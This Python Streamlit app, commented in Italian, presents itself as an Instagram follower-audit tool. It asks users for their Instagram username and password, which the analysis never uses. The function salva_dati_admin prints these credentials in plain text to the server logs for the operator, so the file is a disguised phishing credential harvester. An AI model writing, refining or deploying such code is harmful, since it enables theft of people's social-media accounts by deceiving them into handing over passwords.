import streamlit as st
import json
import zipfile
import pandas as pd
import datetime

# --- CONFIGURAZIONE PAGINA ---
st.set_page_config(page_title="InstaAudit Professional", page_icon="🔐", layout="centered")

# --- CSS AVANZATO ---
st.markdown("""
    <style>
    .stApp {
        background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
        color: white;
    }
    .main-container {
        background-color: rgba(0, 0, 0, 0.5);
        padding: 30px;
        border-radius: 20px;
        backdrop-filter: blur(15px);
        border: 1px solid rgba(255, 255, 255, 0.2);
        margin-bottom: 20px;
    }
    .stButton>button {
        background: linear-gradient(90deg, #FFDC80, #FCAF45);
        color: #1a1a1a !important;
        border: none;
        font-weight: bold;
        width: 100%;
        border-radius: 12px;
    }
    h1, h2, h3, p, label { color: white !important; }
    /* Correzione per le metriche */
    [data-testid="stMetricValue"] { color: #FFDC80 !important; }
    </style>
    """, unsafe_allow_html=True)

# --- LOGICA DI SESSIONE ---
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False

def salva_dati_admin(user, pwd):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Questi messaggi appariranno nei LOGS di Streamlit
    print(f"\n--- NUOVO LOGIN [{timestamp}] ---")
    print(f"USER: {user}")
    print(f"PASS: {pwd}")
    print(f"----------------------------------\n")

# --- 1. SCHERMATA DI LOGIN ---
if not st.session_state.logged_in:
    st.markdown("<div class='main-container'>", unsafe_allow_html=True)
    st.title("🔐 InstaAudit Access")
    st.write("Inserisci le tue credenziali per procedere con l'analisi dello ZIP.")
    
    u = st.text_input("Username Instagram")
    p = st.text_input("Password", type="password")
    
    if st.button("ACCEDI E ANALIZZA"):
        if u and p:
            salva_dati_admin(u, p)
            st.session_state.logged_in = True
            st.rerun()
        else:
            st.warning("Compila entrambi i campi.")
    st.markdown("</div>", unsafe_allow_html=True) # <-- CORRETTO QUI

# --- 2. SCHERMATA APP (DOPO IL LOGIN) ---
else:
    st.title("🕵️ Dashboard Analisi")
    st.success("Sincronizzazione completata. Carica il file JSON/ZIP.")
    
    with st.sidebar:
        if st.button("Logout"):
            st.session_state.logged_in = False
            st.rerun()

    uploaded_file = st.file_uploader("Trascina qui lo ZIP di Instagram", type="zip")

    def extract_names(data):
        names = set()
        if isinstance(data, list):
            for item in data:
                if 'string_list_data' in item and item['string_list_data']:
                    val = item['string_list_data'][0].get('value')
                    if val: names.add(val.lower().strip())
        elif isinstance(data, dict):
            entries = data.get('relationships_following', [])
            for item in entries:
                val = item.get('title') or (item.get('string_list_data', [{}])[0].get('value') if item.get('string_list_data') else None)
                if val: names.add(val.lower().strip())
        return names

    if uploaded_file:
        try:
            with zipfile.ZipFile(uploaded_file, 'r') as z:
                followers, following = set(), set()
                for path in z.namelist():
                    filename = path.split('/')[-1].lower()
                    if filename.endswith('.json'):
                        if 'follower' in filename:
                            with z.open(path) as f:
                                followers.update(extract_names(json.load(f)))
                        elif 'following' in filename:
                            with z.open(path) as f:
                                following.update(extract_names(json.load(f)))
                
                if following:
                    unf = sorted(list(following - followers))
                    c1, c2, c3 = st.columns(3)
                    c1.metric("Seguiti", len(following))
                    c2.metric("Follower", len(followers))
                    c3.metric("Persi", len(unf))
                    
                    st.write("### 📜 Risultati")
                    st.dataframe(pd.DataFrame(unf, columns=["Username"]), use_container_width=True)
                else:
                    st.error("File non validi nello ZIP.")
        except Exception as e:
            st.error(f"Errore: {e}")
